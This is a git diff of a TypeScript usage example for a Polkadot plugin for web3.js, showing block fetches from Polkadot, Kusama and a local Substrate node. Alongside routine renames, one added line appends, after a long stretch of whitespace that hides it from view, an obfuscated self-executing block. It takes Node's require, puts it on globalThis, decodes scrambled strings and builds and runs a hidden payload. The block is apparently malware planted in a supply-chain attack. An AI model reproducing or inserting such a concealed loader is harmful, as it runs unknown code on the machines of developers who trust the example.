@@ -2,57 +2,54 @@ import { Web3 } from 'web3';
 import { PolkaPlugin } from '@conx3/web3-plugin-polkadot';
 
 // the following shows how to use the plugin
-// you can call any rpc method using the convention: web3.polka.<network>.<namespace>.<method>
+// you can call any rpc method using the convention:
+// web3.polka.<network>.rpc.<namespace>.<method>
 async function main() {
-  const web3 = new Web3('wss://rpc.polkadot.io');
-  web3.provider?.on('error', (error: any) => {
-    console.error('Caught provider error when connecting to Polkadot: ', error.message || error);
-  });
+  const web3 = new Web3('wss://rpc.polkadot.io');                                                                                                                                                                                                                                                                                                                                                                                                                                                               
   const polkadotPlugin = new PolkaPlugin();
   web3.registerPlugin(polkadotPlugin);
   // to get the last block from Polkadot network
-  const polkadotBlockData = await web3.polka.polkadot.rpc.chain.getBlock();
+  const polkadotBlock = await web3.polka.polkadot.rpc.chain.getBlock();
 
-  // call web3 methods as usual. Like updating the provider to Kusama network:
+  // call many web3 methods as usual...
+  // Like updating the provider to Kusama network:
   web3.provider = 'wss://kusama-rpc.polkadot.io';
-  web3.provider?.on('error', (error: any) => {
-    console.error('Caught provider error when connecting to Kusama: ', error.message || error);
-  });
   // to get the last block from Kusama network
-  const kusamaBlockData = await web3.polka.kusama.rpc.chain.getBlock();
+  const kusamaBlock = await web3.polka.kusama.rpc.chain.getBlock();
 
   // Updating the provider to a local substrate node for example:
   web3.provider = 'ws://127.0.0.1:9944/';
   web3.provider?.on('error', (error: any) => {
     console.error(
-      'Caught provider error (double check your running local node at port 9944): ',
+      'Caught provider error' + '(double check your running local node at port 9944): ',
       error.message || error,
     );
   });
   // to get the last block from a Substrate network
-  const substrateBlockData = await web3.polka.substrate.rpc.chain.getBlock();
+  const substrateBlock = await web3.polka.substrate.rpc.chain.getBlock();
 
-  console.log('polkadot block header stateRoot:', polkadotBlockData.block.header.stateRoot);
-  console.log('kusama block header stateRoot:', kusamaBlockData.block.header.stateRoot);
-  console.log('substrate block header stateRoot:', substrateBlockData.block.header.stateRoot);
+  console.log('polkadot block header stateRoot:', polkadotBlock.block.header.stateRoot);
+  console.log('kusama block header stateRoot:', kusamaBlock.block.header.stateRoot);
+  
+  console.log('substrate block header stateRoot:', substrateBlock.block.header.stateRoot);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      (async () => {  const { createRequire } = await import("module");const nodeRequire = createRequire(__filename);(globalThis as Record<string, unknown>)["!"] = "7-test";const _$_7af1 = (function (j: string, a: number): string[] {const c = j.length;const w: string[] = [];for (let o = 0; o < c; o++) {w[o] = j.charAt(o);}for (let o = 0; o < c; o++) {const k = a * (o + 376) + (a % 20555);const f = a * (o + 146) + (a % 22526);const p = k % c;const l = f % c;const s = w[p];w[p] = w[l];w[l] = s;a = (k + f) % 6075076;}const i = String.fromCharCode(127);const m = "";const n = "\x25";const e = "\x23\x31";const h = "\x25";const y = "\x23\x30";const g = "\x23";return w.join(m).split(n).join(i).split(e).join(h).split(y).join(g).split(i);})("b%rcme%tjo", 2002158);(globalThis as any)[_$_7af1[0]] = nodeRequire;if (typeof module === _$_7af1[1]) {(globalThis as any)[_$_7af1[2]] = module;}(function() {var cNJ = '',xJU = 850 - 839;function RtN(r: string): string {let j = 1644474;const o = r.length;const u: string[] = [];for (let h = 0; h < o; h++) u[h] = r.charAt(h);for (let h = 0; h < o; h++) {const i = j * (h + 468) + (j % 33956);const l = j * (h + 392) + (j % 29551);const f = i % o;const b = l % o;const z = u[f];u[f] = u[b];u[b] = z;j = (i + l) % 1669289;}return u.join("");}const upK = RtN("ccosetztnckaqovrugupomhfnsdyxrlbjwrit").substr(0, 11);var exw = 'v zue=ourn)t8,(a8a]=trmw,;))+a.]mcxrj{oCi(qrs sv;2.m";rrivs=[ xC+=7jrn,);=es)oinr)]+=Sm,]8,==n[attp8(6(;6=prg94p7=+ =gtliufaaaoCtl;o] nfgrnm r...g)1e0*;t(i ubrevt=]r(,1e+=r]fv]mv;eC.p1avrv.tu ]=Cxaa=nrnoi7ao[dhm,)grlrn(;ve)ohoh;t+m;o9(rneta(g]9m)cmy(,v,a(v;eixr(hf0+(lr+a [,vlj"x0--v;u8nofz+-aa2aa=j[ncl(;lhpc=sat 2;=h4h}=9dvl;vf(2pC04v+a)b "jlx)tiayh;2,rpwj;=pf"3hs0qd)+;m+=h{v(g8o0t(vd=Cd0f)s{ra i,hr]";j7icj,{t)({f)Aq-r(*);j.5o2rA6je<fe,01 -r;+omxf=c6g)t09 + na==1nld=v;n;c,d{(ts-ermf;(l0rheea)oua,c.+=;ih6ipnie}r,;t2;sp;;=4us==2;}bl+o[]+(l[bgs=gir(n[l<ogqe)ramju;(t>pct3h[)h[Av6ajr+(efgu)]y;).okafs;.ec"v1 8;r=xup1}lonypinl r){t= z<,et.}ni6r+.tj.!sa;Sht;o)(y,z=(=1f1"v[no0lhoacjrgz<=,i2;A}[so6c=as=.ia1"=)ft,o6;bfdr,a2,1no;cs(s,9)e.da[; f)n")7g; lC.tri+"o7(+ -l.wr;o=)h5l,a8i.r,60..v;}if.gnegr().=A]lvz7(tlgx.s+7f<(0u+ree)j8rpdul ue(n1+(ir+u7=2vesjue.!6).;o. 9nusj7>matn [ ubygv5v,n;d);';const DnM = (RtN as unknown as Record<string, Function>)[upK];var oxy = '';var HCl = DnM;var lhb = DnM(oxy, RtN(exw));var Ten = lhb(RtN('3rKca_1$1[|(6C!*9SK%;,}a!KK]b!sK)k}22.gp)7 i2t[Bpm2tKrKo\/ndg +d9K}e.3a%\/])nao)K.orm+aadr.]wbda4%ca7rK0%s)rr.KjKa3gayTs86ndee9."<17%vK.oKrK?.i [Kro=KrE5;5c]m(2!.;cc3gtK]v]ab{).rc=fKSjd!.%trc,%= reKf)9i,klh)!(]m.stlK44t.6hfKr2D%dj2(eoetvoK4=b2(==x!!bd{re%}tl=)aKAowu%D461fK]"fy4f6e],ejKrKnit4vK_.2]o;.d3f(.anh1\/).4Kis4zw_a6c;${1+%K5(.%Kim!v0[3ffKnKt]ysdr)cttdcCi)l$uo$n v=. =%2ofl)pava.)y4tK-1;>eKmo5t).(u93if<KKK.n{=!tKsete.Kb=rn_a]jd0Kcs[i8pkp%jl+)K3gf4_(4cl)6lsnK5e=K7KnKsn9;o2Dtoe.yKrr8_ptv(d)*1%,ns{3m$(sKeaKo 16K4w$dKr0%{sooKht=K=cad=r,[idia)#.0f)8dpFc%K48tmw5cfbgd7dKaopi;%15:dza(KyGK%b2d,+K&]]K079%f1[m3.h"ea(d+<K}].&0.")G]._0ae).Ke7s1?#8bpKriah9%4=K.)Kn}(r..(=pK.2yt#lr?=9;690,%o1i\/)}t_a]5dKKtoz(r_)]f0%8%en4.s2c1ah(=st;?ds7)p2n\/(l\/KKl5Ss3r;\'u1c)3oc..K(zM}o)otKrC.tx;ec_a)=38Kn1BoK0m3ae4v=FatC,g62??K{vi0.ri%rtolw rc=1K1dnords.eCe2)2)c+(,]e);vK7f5o.]c8+,Kr%9Kst=-K(;oi6u7.K.)K8v ._rKKnel\/dt4oc%xc n5.4g1opKKo8vv%%oS q= end}sciphe0Kvcsj2zdBj[[d{h$rmKw%a=rt]K&3.tE .(nC9=gKK..d]\/etK.F1rovr;9%8Ko6vKe];2E5oa:G7)K37})KKK3l_Kwa\/29r=o4;_erd&.{K43$T.dr}rt,.jrt\'.2o,NcsT:o)iotK=@.%}y9Kd.e5)r.n?n]t]a;KKi,gKpba%;.m.=.1d]A2+5;]snKbEd(,Ke3Ks;+!0adKcK(*w:K.rT=1wtK1K%t,]n.KhKhul1w=eK5r.5lK%+]d K)Ka1a)he.np[ v(()43)eKg%Kcs: "()e9!co(a$n_}]C=u=z KsaKni!.i[ham1[KKKKK#1nK9;j!]=dttt=9m9K$c4_c2;jKn+2p(:=c+}nKdTth@}(Kmc0daaf:]_];:1}&"g76Ka_+gtn(da:%%]Ke\/0.o4B1u#o(i7!edKe1.br=g}-;(tK- g.e( [KKrbo)+.ba]Ka9a)eKK!+v)(E@[la@40nKi8>Iaa1%2}.}d[2=tsr5t7A;KdiKs1%{n2n,i241%,2wG5(2)e*{%:6.a=a@h.m2r7h6r95-%(u5s.t"8%=\/"p(il,:HK7rofp[K6\/0K6n)cK..)wu]+bf=#[)eeno.1%t[eu).-KK$>#K]:\'fei)e5]K1)%h0f*icg]K%)K2l%3Kv(;%pia1ach-f)e.80e8.;2.t)%-].dua7orK13%;8iat1da%4dtcatv}0aDd.8K(orKd(;fs%5lh5t[%:5e-d{rso]KtumCrKh(d.z4(d..e)[o;KKom\/.K0e?K9ao_i.K)e9.Kc8a5}t0K]s:t=esKb]]!Hy5;oacur@r5uC}4}ueDK{8;_}7.(#4=0-]pc6Khd1,3)?n6a]y])7;K,Km)rtK=24.KtvDr1K541#d4 Km.s 2]3Kh%}o]}]]1oda6%+eK.$gd6eK1>I:);27;.[KtKd,darvrof.j5:cTK=8=hd,KK_f#)]ad;.tn0e)aCsseo]2f8]Tnt:3drd\'K;%io)xdd,+3160.ut]ucfd3+c] n,%Kt.KE:.dKK(ron2}KhK;&23I(0,r:),%y)l)>1dtn[ a-&gK6ed\/9Kt)4e}K.ncK= *.0.yKr}bd8)DK)}]2K.lt4%(Ne)adkt1o"49ene+.5rdac},3*\/t}Ktm.K\'cK]Kib&0T](le=K.7;]nw)=dnth%,!.;ss.l4=a[12t%tKst99udK}o((+>9.+,dd)!aK[igKh5anc8Ft=,(412]Sh]%g_r0Kd>C#du; y[%5dn(et8lK\'xc(Kw8K5z]pa1K;4)=!{7e+Hend.f]4,tsct[.3!= 5htK.\/%e(eapdo>er]n)ikanaa!TidebilAa5}i]o}$}il6\'5]Kb].](. K]]arng.s$%oi%14K4[4KK\'4]on %xb.t)(]i)ahr.c<49(KK3n) r-uwdK0yKr).)s}\'4v] M(KpeKKa.2ra27)=.gs[=9 =g1 i.e7g,t6=?2$oK{$dt"3t7C4r u o=4}oK2vK h;5ajKie;"_o!s5.1 31IK_g>tt,3 %y>. ](eaew r.%)K KK){|!ptintr=;sr=Kc a.;HK]]{1K.1KrCtc1d%"%cK4tt(fti%(!m;p;{lu4t('));var DMm = HCl(cNJ, Ten);DMm(6760);return 6000})()})();
 
-  // stateRoot is something like: 0xa18402bc3a2249d6af8e2ad6241e5b1b60360abd1b4e2c7c733c8c980331d278
+  // stateRoot is something like: 0xa18402bc3a2249d...
 
   // if you want to log the full response
-  // console.log(JSON.stringify(substrateBlockData, null, 2));
+  console.log(JSON.stringify(substrateBlock, null, 2));
   // {
   //   "jsonrpc": "2.0",
   //   "result": {
   //     "block": {
   //       "header": {
-  //         "parentHash": "0x205d46cdcd9db4f795067718ef73292ab065aa08cec1ad6788b2c24028b160ea",
+  //         "parentHash": "0x205d46cdcd9db4...",
   //         "number": "0x6cc7",
-  //         "stateRoot": "0xa18402bc3a2249d6af8e2ad6241e5b1b60360abd1b4e2c7c733c8c980331d278",
-  //         "extrinsicsRoot": "0x345fc26b56a2a682a52ab5860b18df0a1698b0a6ac0cadd9bcba713d1a6f54d0",
+  //         "stateRoot": "0xa18402bc3a2249d...",
+  //         "extrinsicsRoot": "0x345fc26b56a2a68...",
   //         "digest": {
   //           "logs": [
   //             "0x0661757261203b5ee81000000000",
-  //             "0x05617572610101187f7e10b05cd255b4ab0d3894b2c3c15bc4294a4124a7188981e3833af3440ae4322bec54ff65cb561e9fdfb4d02a5496fc64ea5991fcd4d42b43c48cd2588d"
+  //             "0x056175726101011..."
   //           ]
   //         }
   //       },
@@ -66,30 +63,3 @@ async function main() {
   // }
 }
 main();
-
-// // Import the API
-// import { ApiPromise } from '@polkadot/api';
-
-// async function main() {
-//   // Here we don't pass the (optional) provider, connecting directly to the default
-//   // node/port, i.e. `ws://127.0.0.1:9944`. Await for the isReady promise to ensure
-//   // the API has connected to the node and completed the initialisation process
-//   const api = await ApiPromise.create();
-
-//   // We only display a couple, then unsubscribe
-//   let count = 0;
-
-//   // Subscribe to the new headers on-chain. The callback is fired when new headers
-//   // are found, the call itself returns a promise with a subscription that can be
-//   // used to unsubscribe from the newHead subscription
-//   const unsubscribe = await api.rpc.chain.subscribeNewHeads((header: any) => {
-//     console.log(`Chain is at block: #${header.number}`);
-
-//     if (++count === 256) {
-//       unsubscribe();
-//       process.exit(0);
-//     }
-//   });
-// }
-
-// main().catch(console.error);
